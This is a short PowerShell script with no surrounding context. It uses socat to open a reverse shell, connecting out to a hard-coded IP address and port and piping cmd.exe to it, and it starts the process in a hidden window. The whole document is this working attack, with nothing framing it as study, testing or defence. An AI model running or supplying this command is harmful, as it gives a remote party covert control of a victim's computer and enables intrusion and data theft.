$command = ".\socat.exe tcp-connect:35.60.115.182:527 exec:""cmd.exe"",pipes"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden